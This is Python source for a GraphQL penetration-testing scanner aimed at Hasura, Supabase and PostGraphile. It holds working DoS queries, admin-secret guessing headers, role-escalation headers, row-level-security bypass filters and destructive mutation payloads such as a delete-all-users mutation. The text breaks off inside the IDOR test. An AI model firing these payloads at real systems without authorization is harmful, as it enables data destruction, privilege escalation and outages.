"""
GraphQL Advanced Security Scanner.
Enterprise Edition v2.0

Deep GraphQL security testing including DoS, batching, introspection,
and advanced RLS bypass attacks for Supabase/Hasura/PostGraphile.

Enterprise Features Added:
=========================
1. RLS Bypass Attacks (FASE 3.5):
   - Filter manipulation (_eq, _neq, _like bypass)
   - Column access control bypass
   - Aggregate function abuse (count, sum leakage)
   - Relationship traversal attacks
   - Mutation authorization bypass
   - Subscription data leakage

2. Supabase-Specific:
   - RLS policy enumeration
   - Service role key detection
   - PostgREST filter bypass
   - Realtime channel security

3. Hasura-Specific:
   - Admin secret probe
   - Permission boundary testing
   - Remote schema attacks
   - Event trigger security

4. Advanced Techniques:
   - Computed field abuse
   - Custom function exploitation
   - View-based RLS bypass
   - Aggregate permission bypass

CWE Coverage:
- CWE-200: Information Disclosure
- CWE-284: Improper Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-400: Uncontrolled Resource Consumption
- CWE-943: Improper Neutralization in Data Query Logic
- CWE-307: Improper Restriction of Excessive Authentication Attempts

Author: PetNTester AI Enterprise
Version: 2.0.0
"""

from __future__ import annotations

import json
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin, quote

import httpx

from scanning.findings import Finding, Severity
from scanning.vuln_scanner import ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter
from scanning.scan_context import ScanContext

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


# ============================================================================
# ENTERPRISE DATA STRUCTURES
# ============================================================================

class GraphQLVulnType(Enum):
    """Types of GraphQL vulnerabilities."""
    # Core GraphQL attacks
    INTROSPECTION_ENABLED = auto()
    BATCHING_ATTACK = auto()
    ALIAS_DOS = auto()
    DEPTH_ATTACK = auto()
    FIELD_SUGGESTION = auto()
    DIRECTIVE_ABUSE = auto()
    CIRCULAR_FRAGMENT = auto()
    IDOR = auto()
    INJECTION = auto()

    # RLS/Access control bypass (Hasura/Supabase)
    RLS_BYPASS = auto()
    FILTER_MANIPULATION = auto()
    COLUMN_ACCESS = auto()
    AGGREGATE_ABUSE = auto()
    RELATIONSHIP_TRAVERSAL = auto()
    MUTATION_BYPASS = auto()
    SUBSCRIPTION_LEAK = auto()
    ADMIN_SECRET_FOUND = auto()
    SERVICE_ROLE_KEY = auto()

    # Modern GraphQL attacks (2026-02-18)
    PERSISTED_QUERY_ABUSE = auto()      # APQ enumeration/bypass
    COMPLEXITY_BYPASS = auto()           # Fragment spreading complexity bypass
    FIELD_DUPLICATION_DOS = auto()       # Repeated fields without aliases
    EXTENSION_EXPOSURE = auto()          # Apollo tracing, debug info
    FEDERATION_SDL_LEAK = auto()         # _service query exposure
    FEDERATION_ENTITY_ACCESS = auto()    # _entities direct access
    WEBSOCKET_SUBSCRIPTION = auto()      # WS endpoint security
    TYPE_CONFUSION = auto()              # Interface/Union auth bypass
    DEFER_ABUSE = auto()                 # @defer directive DoS


@dataclass
class SchemaInfo:
    """Extracted GraphQL schema information."""
    types: list[str] = field(default_factory=list)
    queries: list[str] = field(default_factory=list)
    mutations: list[str] = field(default_factory=list)
    subscriptions: list[str] = field(default_factory=list)
    sensitive_fields: list[str] = field(default_factory=list)
    filter_args: list[str] = field(default_factory=list)
    backend_type: str | None = None  # supabase, hasura, postgraphile, etc.


# Enterprise RLS bypass payloads for filter manipulation
RLS_FILTER_BYPASS_PAYLOADS = [
    # Boolean condition bypass
    {"_or": [{"id": {"_eq": 1}}, {"id": {"_neq": 1}}]},
    {"_and": [{"_not": {"id": {"_is_null": True}}}]},
    # Always true conditions
    {"id": {"_gte": 0}},
    {"id": {"_is_null": False}},
    # Type coercion
    {"id": {"_eq": "1"}},  # String instead of int
    {"id": {"_in": [1, 2, 3, 4, 5]}},
    # Nested filter bypass
    {"_or": [{"_and": [{"id": {"_gte": 1}}]}, {"id": {"_lte": 999999}}]},
    # LIKE wildcards
    {"email": {"_like": "%"}},
    {"email": {"_ilike": "%@%"}},
    {"username": {"_similar": "%"}},
    # Regex bypass (Hasura)
    {"email": {"_regex": ".*"}},
    {"username": {"_iregex": ".*"}},
]

# Aggregate abuse payloads
AGGREGATE_PAYLOADS = [
    "aggregate { count }",
    "aggregate { count(columns: id) }",
    "aggregate { sum { amount } }",
    "aggregate { avg { price } }",
    "aggregate { max { created_at } }",
    "aggregate { min { id } }",
]

# Relationship traversal payloads for RLS bypass
RELATIONSHIP_TRAVERSAL_PAYLOADS = [
    # Access through parent
    "parent { children { sensitiveField } }",
    # Access through sibling
    "user { orders { user { password } } }",
    # Circular reference abuse
    "author { posts { author { email } } }",
    # Many-to-many bypass
    "users_roles { role { permissions } }",
]

# Supabase-specific payloads
SUPABASE_RLS_PAYLOADS = [
    # Service role bypass attempts
    {"headers": {"apikey": "service_role_key_here", "Authorization": "Bearer service_role"}},
    # RLS policy enumeration
    {"query": "{ __type(name: \"Query\") { fields { name } } }"},
    # PostgREST filter syntax
    {"select": "*", "id": "eq.any"},
]

# Hasura-specific payloads
HASURA_PAYLOADS = [
    # Admin secret probe headers
    {"x-hasura-admin-secret": "admin", "x-hasura-role": "admin"},
    {"x-hasura-admin-secret": "secret", "x-hasura-role": "admin"},
    {"x-hasura-admin-secret": "hasura", "x-hasura-role": "admin"},
    {"x-hasura-admin-secret": "password", "x-hasura-role": "admin"},
    # Role escalation
    {"x-hasura-role": "admin"},
    {"x-hasura-role": "user", "x-hasura-user-id": "1"},
    # Allow list bypass
    {"x-hasura-allowed-roles": '["admin"]'},
]

# Mutation bypass payloads
MUTATION_BYPASS_PAYLOADS = [
    # Insert with elevated data
    "insert_users(objects: {role: \"admin\"}) { returning { id role } }",
    # Update bypass
    "update_users(where: {id: {_eq: 1}}, _set: {is_admin: true}) { affected_rows }",
    # Delete bypass
    "delete_users(where: {}) { affected_rows }",
    # Upsert abuse
    "insert_users(objects: {id: 1, role: \"admin\"}, on_conflict: {constraint: users_pkey, update_columns: [role]}) { returning { id } }",
]


class GraphQLAdvancedScanner(ScanModule):
    """
    GraphQL Advanced Security Scanner.
    Enterprise Edition v2.0
    
    Tests for:
    - Introspection enabled
    - Batching attacks
    - Alias-based DoS
    - Deep query attacks
    - Field suggestion leakage
    - Directive abuse
    - Subscription abuse
    - Fragment injection
    - Circular fragment detection
    - Query cost analysis bypass
    - Field duplication DoS
    - Type confusion
    
    Enterprise RLS Bypass (FASE 3.5):
    - Filter manipulation attacks
    - Column access control bypass
    - Aggregate function abuse
    - Relationship traversal attacks
    - Mutation authorization bypass
    - Subscription data leakage
    - Supabase RLS policy testing
    - Hasura permission testing
    """
    
    name = "graphql_advanced_scanner"

    # G-04 FIX: Overall scan timeout to prevent hangs
    MAX_SCAN_DURATION = 180.0  # 3 minutes max

    # G-04 FIX: Common GraphQL endpoints - Extended with training apps
    GRAPHQL_ENDPOINTS = [
        # === Standard GraphQL paths ===
        "/graphql",
        "/graphql/",
        "/api/graphql",
        "/api/v1/graphql",
        "/api/v2/graphql",
        "/v1/graphql",
        "/v2/graphql",
        "/query",
        "/gql",
        "/graphiql",
        "/__graphql",

        # === Hasura endpoints ===
        "/v1/graphql",
        "/v1alpha1/graphql",
        "/v1beta1/graphql",
        "/console/api/api-console/graphql",

        # === Supabase endpoints ===
        "/rest/v1/",
        "/graphql/v1",

        # === PostGraphile ===
        "/postgraphile",
        "/postgraphile/graphql",

        # === G-04 FIX: Training app / CTF endpoints ===
        # Damn Vulnerable GraphQL Application (DVGA)
        "/graphql",
        "/graphiql",

        # Juice Shop GraphQL
        "/api/Challenges",
        "/api/Quantitys",

        # NodeGoat / custom apps
        "/api/data/graphql",
        "/app/graphql",

        # Altair / Playground
        "/playground",
        "/altair",

        # Apollo Server default
        "/apollo",
        "/apollo/graphql",

        # AWS AppSync
        "/appsync",
        "/api/appsync",
    ]
    
    # Sensitive field patterns for RLS testing
    SENSITIVE_FIELDS = [
        "password", "secret", "token", "key", "auth",
        "credit_card", "ssn", "salary", "admin", "internal",
        "private", "hash", "api_key", "access_token", "refresh_token",
    ]
    
    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.schema_info: SchemaInfo | None = None
        self._discovered_tables: list[str] = []
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Scan for advanced GraphQL vulnerabilities - Enterprise Edition."""
        findings: list[Finding] = []
        scan_start = time.time()  # G-04 FIX: Track scan start time

        # G-04 FIX: Helper to check timeout
        def check_timeout() -> bool:
            return (time.time() - scan_start) >= self.MAX_SCAN_DURATION

        base_url = f"https://{host}" if not host.startswith("http") else host

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        async with httpx.AsyncClient(
            verify=False, timeout=self.timeout, headers=self._auth_headers
        ) as client:
            # Discover GraphQL endpoints
            graphql_url = await self._discover_graphql(client, base_url, rate_limiter)

            if not graphql_url:
                logger.info(f"No GraphQL endpoint found for {host}")
                return findings

            logger.info(f"[GraphQL] Found endpoint: {graphql_url}")

            # Detect backend type (Supabase, Hasura, etc.)
            self.schema_info = await self._extract_schema_info(client, graphql_url, rate_limiter)

            # G-04 FIX: Test introspection (always run - fast and important)
            intro_findings = await self._test_introspection(
                client, graphql_url, rate_limiter
            )
            findings.extend(intro_findings)

            # G-04 FIX: Check timeout after each phase
            if check_timeout():
                logger.info("[GraphQL] Timeout reached - returning partial results")
                return findings

            # Test batching attacks
            batch_findings = await self._test_batching_attacks(
                client, graphql_url, rate_limiter
            )
            findings.extend(batch_findings)

            if check_timeout():
                return findings

            # Test alias-based DoS
            alias_findings = await self._test_alias_dos(
                client, graphql_url, rate_limiter
            )
            findings.extend(alias_findings)

            if check_timeout():
                return findings

            # Test deep query DoS
            depth_findings = await self._test_depth_attack(
                client, graphql_url, rate_limiter
            )
            findings.extend(depth_findings)

            if check_timeout():
                return findings

            # Test field suggestion leakage
            suggestion_findings = await self._test_field_suggestions(
                client, graphql_url, rate_limiter
            )
            findings.extend(suggestion_findings)

            if check_timeout():
                return findings

            # Test directive abuse
            directive_findings = await self._test_directive_abuse(
                client, graphql_url, rate_limiter
            )
            findings.extend(directive_findings)

            if check_timeout():
                return findings

            # Test circular fragments
            fragment_findings = await self._test_circular_fragments(
                client, graphql_url, rate_limiter
            )
            findings.extend(fragment_findings)

            if check_timeout():
                return findings

            # Test IDOR via GraphQL
            idor_findings = await self._test_graphql_idor(
                client, graphql_url, rate_limiter
            )
            findings.extend(idor_findings)

            if check_timeout():
                return findings

            # Test injection in variables
            injection_findings = await self._test_variable_injection(
                client, graphql_url, rate_limiter
            )
            findings.extend(injection_findings)

            # ================================================================
            # ENTERPRISE: RLS BYPASS TESTING (FASE 3.5)
            # G-04 FIX: Only run if we have time remaining (< 70% used)
            # ================================================================
            if (time.time() - scan_start) < self.MAX_SCAN_DURATION * 0.7:
                # Test filter manipulation attacks
                filter_findings = await self._test_rls_filter_bypass(
                    client, graphql_url, rate_limiter
                )
                findings.extend(filter_findings)

                if not check_timeout():
                    # Test column access control bypass
                    column_findings = await self._test_column_access_bypass(
                        client, graphql_url, rate_limiter
                    )
                    findings.extend(column_findings)

                if not check_timeout():
                    # Test aggregate function abuse
                    aggregate_findings = await self._test_aggregate_abuse(
                        client, graphql_url, rate_limiter
                    )
                    findings.extend(aggregate_findings)

                if not check_timeout():
                    # Test relationship traversal attacks
                    relationship_findings = await self._test_relationship_traversal(
                        client, graphql_url, rate_limiter
                    )
                    findings.extend(relationship_findings)
            
            # G-04 FIX: Remaining tests only if time permits
            if not check_timeout():
                # Test mutation authorization bypass
                mutation_findings = await self._test_mutation_bypass(
                    client, graphql_url, rate_limiter
                )
                findings.extend(mutation_findings)

            # Test Hasura-specific attacks
            if not check_timeout() and self.schema_info and self.schema_info.backend_type == "hasura":
                hasura_findings = await self._test_hasura_specific(
                    client, graphql_url, rate_limiter
                )
                findings.extend(hasura_findings)

            # Test Supabase-specific attacks
            if not check_timeout() and self.schema_info and self.schema_info.backend_type == "supabase":
                supabase_findings = await self._test_supabase_specific(
                    client, graphql_url, rate_limiter
                )
                findings.extend(supabase_findings)

            # Test subscription data leakage
            if not check_timeout():
                subscription_findings = await self._test_subscription_leakage(
                    client, graphql_url, rate_limiter
                )
                findings.extend(subscription_findings)

            # ================================================================
            # MODERN GRAPHQL ATTACKS (2026-02-18)
            # Additional coverage for APQ, complexity bypass, field duplication,
            # extensions exposure, federation attacks, and type confusion
            # ================================================================

            # Test Persisted Queries (APQ) vulnerabilities
            if not check_timeout():
                apq_findings = await self._test_persisted_queries(
                    client, graphql_url, rate_limiter
                )
                findings.extend(apq_findings)

            # Test Query Complexity bypass
            if not check_timeout():
                complexity_findings = await self._test_query_complexity_bypass(
                    client, graphql_url, rate_limiter
                )
                findings.extend(complexity_findings)

            # Test Field Duplication DoS
            if not check_timeout():
                field_dup_findings = await self._test_field_duplication_dos(
                    client, graphql_url, rate_limiter
                )
                findings.extend(field_dup_findings)

            # Test Extension/Debug info exposure
            if not check_timeout():
                extension_findings = await self._test_extension_exposure(
                    client, graphql_url, rate_limiter
                )
                findings.extend(extension_findings)

            # Test Apollo Federation attacks
            if not check_timeout():
                federation_findings = await self._test_apollo_federation_attacks(
                    client, graphql_url, rate_limiter
                )
                findings.extend(federation_findings)

            # Test WebSocket subscription security
            if not check_timeout():
                ws_findings = await self._test_websocket_subscription(
                    client, graphql_url, rate_limiter
                )
                findings.extend(ws_findings)

            # Test Type Confusion attacks (last - requires introspection)
            if not check_timeout():
                type_confusion_findings = await self._test_type_confusion(
                    client, graphql_url, rate_limiter
                )
                findings.extend(type_confusion_findings)

            if check_timeout():
                logger.info(f"[GraphQL] Scan completed with timeout - {len(findings)} findings")

        return findings
    
    async def _discover_graphql(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> str | None:
        """
        Discover GraphQL endpoint.

        GAP-A3 FIX 2026-02-18: Enhanced discovery for training apps
        - Try both POST and GET methods (DVGA supports both)
        - Accept more response formats (some servers don't wrap in "data")
        - Better logging for debugging discovery issues
        """
        simple_query = "{__typename}"

        for path in self.GRAPHQL_ENDPOINTS:
            url = urljoin(base_url, path)

            # === Method 1: POST with JSON body (standard) ===
            await rate_limiter.acquire()
            try:
                response = await client.post(
                    url,
                    json={"query": simple_query},
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        # Standard response: {"data": {"__typename": "Query"}}
                        if isinstance(data, dict):
                            if "data" in data or "errors" in data:
                                logger.info(f"[GraphQL] Endpoint found (POST): {url}")
                                return url
                            # Alternate response: {"__typename": "Query"} (no wrapper)
                            if "__typename" in data:
                                logger.info(f"[GraphQL] Endpoint found (POST, unwrapped): {url}")
                                return url
                    except json.JSONDecodeError:
                        pass
                elif response.status_code == 400:
                    # GraphQL often returns 400 for malformed queries but still indicates endpoint
                    try:
                        data = response.json()
                        if isinstance(data, dict) and "errors" in data:
                            # GraphQL error = endpoint exists
                            logger.info(f"[GraphQL] Endpoint found (POST, error response): {url}")
                            return url
                    except json.JSONDecodeError:
                        pass

            except Exception as e:
                logger.debug(f"[GraphQL] POST check error for {path}: {e}")

            # === Method 2: GET with query parameter (alternate, some servers prefer) ===
            await rate_limiter.acquire()
            try:
                get_url = f"{url}?query={quote(simple_query)}"
                response = await client.get(get_url)

                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            if "data" in data or "errors" in data or "__typename" in data:
                                logger.info(f"[GraphQL] Endpoint found (GET): {url}")
                                return url
                    except json.JSONDecodeError:
                        pass

            except Exception as e:
                logger.debug(f"[GraphQL] GET check error for {path}: {e}")

            # === Method 3: POST with operationName (some training apps require this) ===
            await rate_limiter.acquire()
            try:
                response = await client.post(
                    url,
                    json={
                        "query": "query TypenameQuery { __typename }",
                        "operationName": "TypenameQuery"
                    },
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict) and ("data" in data or "errors" in data):
                            logger.info(f"[GraphQL] Endpoint found (POST with operationName): {url}")
                            return url
                    except json.JSONDecodeError:
                        pass

            except Exception as e:
                logger.debug(f"[GraphQL] POST+operationName error for {path}: {e}")

        # === Fallback: Check asset_data for GraphQL endpoints from discovery phase ===
        if hasattr(self, '_ctx') and self._ctx:
            endpoints = getattr(self._ctx, '_asset_data', {}).get('endpoints', [])
            for ep in endpoints:
                ep_str = str(ep).lower() if ep else ""
                if 'graphql' in ep_str or 'gql' in ep_str:
                    # Found GraphQL-like endpoint from discovery
                    await rate_limiter.acquire()
                    try:
                        response = await client.post(
                            ep,
                            json={"query": simple_query},
                            headers={"Content-Type": "application/json"}
                        )
                        if response.status_code in (200, 400):
                            try:
                                data = response.json()
                                if isinstance(data, dict) and ("data" in data or "errors" in data):
                                    logger.info(f"[GraphQL] Endpoint found from asset_data: {ep}")
                                    return ep
                            except json.JSONDecodeError:
                                pass
                    except Exception as e:
                        logger.debug(f"[GraphQL] asset_data check error: {e}")

        logger.info(f"[GraphQL] No endpoint found after checking {len(self.GRAPHQL_ENDPOINTS)} paths")
        return None
    
    async def _test_introspection(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test if introspection is enabled."""
        findings = []
        
        introspection_query = """
        query IntrospectionQuery {
            __schema {
                types {
                    name
                    fields {
                        name
                    }
                }
                queryType { name }
                mutationType { name }
            }
        }
        """
        
        await rate_limiter.acquire()
        
        try:
            response = await client.post(
                graphql_url,
                json={"query": introspection_query},
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                data = response.json()

                # FIX 2026-02-16: Removed undefined `asset_data` check - check `data` instead
                if isinstance(data, dict) and "data" in data and isinstance(data["data"], dict) and data["data"].get("__schema"):
                    schema = data["data"]["__schema"]
                    types_count = len(schema.get("types", []))

                    findings.append(Finding(
                        name="GraphQL Introspection Enabled",
                        severity=Severity.MEDIUM,
                        confidence_score=85.0,
                        description="GraphQL introspection is enabled, exposing schema structure",
                        endpoint=graphql_url,
                        evidence=[
                            f"Schema exposed with {types_count} types",
                            f"Query type: {schema.get('queryType', {}).get('name')}",
                            f"Mutation type: {schema.get('mutationType', {}).get('name')}",
                        ],
                        cwe_id="CWE-200",
                        cvss_score=5.3,
                        remediation="Disable introspection in production. "
                                "Use: graphql.validation.NoSchemaIntrospectionCustomRule",
                    ))

                    # Check for sensitive types
                    sensitive_patterns = ["user", "admin", "password", "token", "secret", "internal"]
                    types = schema.get("types", [])

                    for t in types:
                        type_name = t.get("name", "").lower()
                        if any(p in type_name for p in sensitive_patterns):
                            if not type_name.startswith("__"):
                                findings.append(Finding(
                                    name="Sensitive Type Exposed in Schema",
                                    severity=Severity.LOW,
                                    confidence_score=65.0,
                                    description=f"Potentially sensitive type: {t.get('name')}",
                                    endpoint=graphql_url,
                                    evidence=[f"Type name: {t.get('name')}"],
                                    cwe_id="CWE-200",
                                    remediation="Review exposed types for sensitive data.",
                                ))
                                break
                                
        except Exception as e:
            logger.debug(f"Error testing introspection: {e}")

        # FIX 2026-02-16: Also test partial introspection (when full __schema is blocked)
        # Many GraphQL servers block full introspection but allow __type queries
        await rate_limiter.acquire()
        try:
            partial_queries = [
                '{ __type(name: "Query") { name fields { name } } }',
                '{ __type(name: "User") { name fields { name type { name } } } }',
                '{ __type(name: "Mutation") { name fields { name } } }',
                '{ __typename }',
            ]

            for query in partial_queries:
                response = await client.post(
                    graphql_url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code == 200:
                    data = response.json()
                    if isinstance(data, dict) and "data" in data and data["data"]:
                        # Check if we got actual type information
                        type_data = data["data"].get("__type") or data["data"].get("__typename")
                        if type_data:
                            # Only add finding if we haven't already found full introspection
                            existing_intro = any(f.name == "GraphQL Introspection Enabled" for f in findings)
                            if not existing_intro:
                                findings.append(Finding(
                                    name="GraphQL Partial Introspection",
                                    severity=Severity.LOW,
                                    confidence_score=70.0,
                                    description="GraphQL allows partial schema introspection via __type queries",
                                    endpoint=graphql_url,
                                    evidence=[
                                        f"Query: {query}",
                                        f"Response revealed type information",
                                    ],
                                    cwe_id="CWE-200",
                                    cvss_score=3.7,
                                    remediation="Consider disabling all introspection in production.",
                                ))
                            break  # One finding is enough

        except Exception as e:
            logger.debug(f"Error testing partial introspection: {e}")

        return findings

    async def _test_batching_attacks(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for batching attacks (brute force via single request)."""
        findings = []
        
        # Batch multiple queries in single request
        batch_queries = [
            {"query": "{__typename}", "operationName": f"q{i}"}
            for i in range(100)
        ]
        
        await rate_limiter.acquire()
        
        try:
            start_time = time.time()
            response = await client.post(
                graphql_url,
                json=batch_queries,
                headers={"Content-Type": "application/json"}
            )
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    if isinstance(data, list) and len(data) > 50:
                        findings.append(Finding(
                            name="GraphQL Batching Attack Possible",
                            severity=Severity.HIGH,
                            confidence_score=85.0,
                            description="GraphQL accepts batched queries allowing brute force in single request",
                            endpoint=graphql_url,
                            evidence=[
                                f"100 queries executed in {elapsed:.2f}s",
                                f"Batch response length: {len(data)}",
                            ],
                            cwe_id="CWE-307",
                            cvss_score=7.5,
                            remediation="Limit batch query count. Implement query cost analysis. "
                                       "Add rate limiting per operation.",
                        ))
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            logger.debug(f"Error testing batching: {e}")
        
        return findings
    
    async def _test_alias_dos(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for alias-based DoS attacks."""
        findings = []
        
        # Generate query with many aliases
        aliases = [f"a{i}: __typename" for i in range(1000)]
        dos_query = "query { " + " ".join(aliases) + " }"
        
        await rate_limiter.acquire()
        
        try:
            start_time = time.time()
            response = await client.post(
                graphql_url,
                json={"query": dos_query},
                headers={"Content-Type": "application/json"},
                timeout=30.0
            )
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                try:
                    data = response.json()

                    # FIX 2026-02-16: Removed undefined `asset_data` check
                    severity = "MEDIUM"
                    if isinstance(data, dict) and "data" in data and isinstance(data["data"], dict) and len(data["data"]) > 500:
                        severity = "HIGH" if elapsed > 5 else "MEDIUM"

                    findings.append(Finding(
                        name="GraphQL Alias-Based DoS",
                        severity=severity,
                        confidence_score=85.0,
                        description="GraphQL accepts queries with many aliases enabling DoS",
                        endpoint=graphql_url,
                        evidence=[
                            f"1000 aliases executed",
                            f"Response time: {elapsed:.2f}s",
                            f"Response fields: {len(data.get('data', {}))}" if isinstance(data, dict) else "Response fields: N/A",
                        ],
                        cwe_id="CWE-400",
                        cvss_score=6.5,
                        remediation="Implement alias limit. Use query complexity analysis. "
                                   "Set maximum query depth and breadth.",
                    ))
                except json.JSONDecodeError:
                    pass
                    
        except httpx.TimeoutException:
            findings.append(Finding(
                name="GraphQL Alias-Based DoS - Timeout",
                severity=Severity.HIGH,
                confidence_score=85.0,
                description="GraphQL query with many aliases caused timeout",
                endpoint=graphql_url,
                evidence=["Request timed out with 1000 aliases"],
                cwe_id="CWE-400",
                cvss_score=7.5,
                remediation="Implement query complexity limits.",
            ))
        except Exception as e:
            logger.debug(f"Error testing alias DoS: {e}")
        
        return findings
    
    async def _test_depth_attack(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for deep query nesting attack."""
        findings = []
        
        # Build deeply nested query
        depth = 50
        inner = "__typename"
        for i in range(depth):
            inner = f"__type(name: \"Query\") {{ name fields {{ name type {{ {inner} }} }} }}"
        
        deep_query = f"query {{ {inner} }}"
        
        await rate_limiter.acquire()
        
        try:
            start_time = time.time()
            response = await client.post(
                graphql_url,
                json={"query": deep_query},
                headers={"Content-Type": "application/json"},
                timeout=30.0
            )
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                findings.append(Finding(
                    name="GraphQL Deep Query Attack",
                    severity=Severity.MEDIUM,
                    confidence_score=65.0,
                    description="GraphQL accepts deeply nested queries (DoS vector)",
                    endpoint=graphql_url,
                    evidence=[
                        f"Query depth: {depth} levels",
                        f"Response time: {elapsed:.2f}s",
                    ],
                    cwe_id="CWE-400",
                    cvss_score=5.3,
                    remediation="Implement maximum query depth limit (e.g., 10 levels). "
                               "Use graphql-depth-limit or similar.",
                ))
                
        except httpx.TimeoutException:
            findings.append(Finding(
                name="GraphQL Deep Query DoS",
                severity=Severity.HIGH,
                confidence_score=85.0,
                description="Deep nested query caused server timeout",
                endpoint=graphql_url,
                evidence=[f"Request with {depth} nesting levels timed out"],
                cwe_id="CWE-400",
                cvss_score=7.5,
                remediation="Implement strict depth limits.",
            ))
        except Exception as e:
            logger.debug(f"Error testing depth attack: {e}")
        
        return findings
    
    async def _test_field_suggestions(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for field suggestion information leakage."""
        findings = []
        
        # Query with typo to trigger suggestions
        typo_queries = [
            {"query": "{ usr }"},
            {"query": "{ passwrd }"},
            {"query": "{ admn }"},
            {"query": "{ secrt }"},
            {"query": "{ tokn }"},
        ]
        
        for payload in typo_queries:
            await rate_limiter.acquire()
            
            try:
                response = await client.post(
                    graphql_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()

                    # BUG-FIX: Only process dict responses, not arrays
                    if isinstance(data, dict) and "errors" in data:
                        error_text = str(data["errors"]).lower()

                        if "did you mean" in error_text or "suggestion" in error_text:
                            findings.append(Finding(
                                name="GraphQL Field Suggestion Leakage",
                                severity=Severity.LOW,
                                confidence_score=85.0,
                                description="GraphQL provides field name suggestions on errors",
                                endpoint=graphql_url,
                                evidence=[
                                    f"Query: {payload['query']}",
                                    "Field suggestions in error response",
                                ],
                                cwe_id="CWE-200",
                                cvss_score=3.7,
                                remediation="Disable field suggestions in production. "
                                           "Use generic error messages.",
                            ))
                            break
                            
            except Exception as e:
                logger.debug(f"Error testing suggestions: {e}")
        
        return findings
    
    async def _test_directive_abuse(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for directive abuse."""
        findings = []
        
        # Test directive overloading
        directive_queries = [
            # Multiple @skip/@include
            {"query": "{ __typename @skip(if: false) @skip(if: false) @skip(if: false) }"},
            # Directive on wrong location
            {"query": "query @deprecated { __typename }"},
            # Custom directive probe
            {"query": "{ __typename @internal }"},
            {"query": "{ __typename @debug }"},
            {"query": "{ __typename @admin }"},
        ]
        
        for payload in directive_queries:
            await rate_limiter.acquire()
            
            try:
                response = await client.post(
                    graphql_url,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code == 200:
                    data = response.json()

                    # FIX 2026-02-16: Removed undefined `asset_data` check
                    if isinstance(data, dict) and "data" in data and data["data"]:
                        if "@internal" in payload["query"] or "@debug" in payload["query"] or "@admin" in payload["query"]:
                            findings.append(Finding(
                                name="GraphQL Custom Directive Accepted",
                                severity=Severity.MEDIUM,
                                confidence_score=65.0,
                                description="GraphQL accepts custom directives that may bypass security",
                                endpoint=graphql_url,
                                evidence=[f"Directive query accepted: {payload['query']}"],
                                cwe_id="CWE-284",
                                cvss_score=5.3,
                                remediation="Validate and restrict allowed directives.",
                            ))
                        break
                            
            except Exception as e:
                logger.debug(f"Error testing directives: {e}")
        
        return findings
    
    async def _test_circular_fragments(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for circular fragment references (DoS)."""
        findings = []
        
        # Circular fragment reference
        circular_query = """
        query {
            __typename
            ...A
        }
        fragment A on Query {
            __typename
            ...B
        }
        fragment B on Query {
            __typename
            ...A
        }
        """
        
        await rate_limiter.acquire()
        
        try:
            start_time = time.time()
            response = await client.post(
                graphql_url,
                json={"query": circular_query},
                headers={"Content-Type": "application/json"},
                timeout=10.0
            )
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                data = response.json()

                # FIX 2026-02-16: Removed undefined `asset_data` check
                if isinstance(data, dict):
                    if "errors" not in data or not any("circular" in str(e).lower() for e in data.get("errors", [])):
                        findings.append(Finding(
                            name="GraphQL Circular Fragment Not Detected",
                            severity=Severity.MEDIUM,
                            confidence_score=65.0,
                            description="GraphQL doesn't properly reject circular fragment references",
                            endpoint=graphql_url,
                            evidence=[
                                "Circular fragments accepted",
                                f"Response time: {elapsed:.2f}s",
                            ],
                            cwe_id="CWE-400",
                            cvss_score=5.3,
                            remediation="Enable fragment cycle detection in GraphQL validation.",
                        ))
                    
        except httpx.TimeoutException:
            findings.append(Finding(
                name="GraphQL Circular Fragment DoS",
                severity=Severity.HIGH,
                confidence_score=85.0,
                description="Circular fragment references caused timeout",
                endpoint=graphql_url,
                evidence=["Request with circular fragments timed out"],
                cwe_id="CWE-400",
                cvss_score=7.5,
                remediation="Implement fragment cycle detection.",
            ))
        except Exception as e:
            logger.debug(f"Error testing circular fragments: {e}")
        
        return findings
    
    async def _test_graphql_idor(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for IDOR vulnerabilities in GraphQL."""
